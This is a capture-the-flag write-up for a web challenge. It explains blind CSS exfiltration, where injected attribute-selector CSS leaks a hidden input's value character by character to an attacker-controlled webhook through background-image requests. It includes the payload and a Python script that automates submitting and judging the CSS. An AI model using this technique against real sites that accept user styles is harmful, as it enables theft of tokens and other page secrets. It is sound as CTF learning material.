

# 0x01

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>My Beautiful Site</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
      crossorigin="anonymous"
    />
    <link href="/uploads/{{submit_id}}.css" rel="stylesheet" />
  </head>
  <body>
    <div class="container">
      <h1 id="title">Welcome to my beautiful site</h1>
      <p id="sub-header">
        Here is some content that I want to share with you. An example can be
        this flag:
      </p>
      <input id="flag" value="{{ flag }}" />
    </div>
    <div class="container mt-4">
      <form action="/judge/{{submit_id}}" method="post">
        <input type="submit" value="Submit for judging">
      </form>
    </div>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
```

We can see that we are to craft our own CSS, which will be submitted for judging. Therefore, we are able to use `Blind CSS Exfiltration` vulnerability for this challenge (https://portswigger.net/research/blind-css-exfiltration) to get the flag

# 0x02

Firstly we need setup a Webhook, and the payload we will be using: 

```css
input[id=flag][value^='grey{... ']{
	background-image: url(<webhook-url>?flag=grey{ ...);
	color: red;
	}
```

By doing such, when the `value ^= 'grey{... '` is a valid CSS property value, it will trigger a request with the value of the flag `grey{... `, and we are able to receive the flag by accessing the Webhook.

## 0x03

Secondly, we need to write a python script:

```python
import requests
from bs4 import BeautifulSoup

url = "http://challs.nusgreyhats.org:33339/"


def submit(content):
    # css injection
    data = {"css_value" : "input[id=flag][value^='" + content + "']{background-image: url(<webhook site>?flag=" + content + ");color: red;}"}
    print("Payload:", data["css_value"])
    # sending data to "/submit"
    request = requests.post(url=url + "/submit", data=data)
    print("Url: ",url)
    # filter out judgeLink
    soup = BeautifulSoup(request.text, "html.parser")
    form = soup.find("form")
    judgeLink = form.get("action")
    return judgeLink


def judge(flagTest):
      newUrl = url + flagTest
      request2 = requests.post(newUrl)       
      

if __name__ == "__main__":
    words = '1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZf}'
    flag = 'grey{'
    for i in words:
        flagTest = flag + i
        judgeLink = submit(flagTest)
        print("judgeLink:", judgeLink)
        judge(judgeLink)
        print("---------------------------------------------------------")

```

By running it once, we checked the Webhook and discovered the Webhook recieved a get request and the 'flag' parameter has a value of "grey{X". This means that the first part of the flag is "grey{X"

We need to changing and updating the flag value:

```python
if __name__ == "__main__":
    words = '1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZf}'
    flag = 'grey{X' # updating the flag value
    for i in words:
        flagTest = flag + i
        judgeLink = submit(flagTest)
        print("judgeLink:", judgeLink)
        judge(judgeLink)
        print("---------------------------------------------------------")
```

By repeating the whole process mutiple times, we are able to get the flag `grey{X5S34RCH1fY0UC4NF1ND1T}` (We will eventually stop when the flag has a closing bracket as the format of the flag is `grey{...}`)

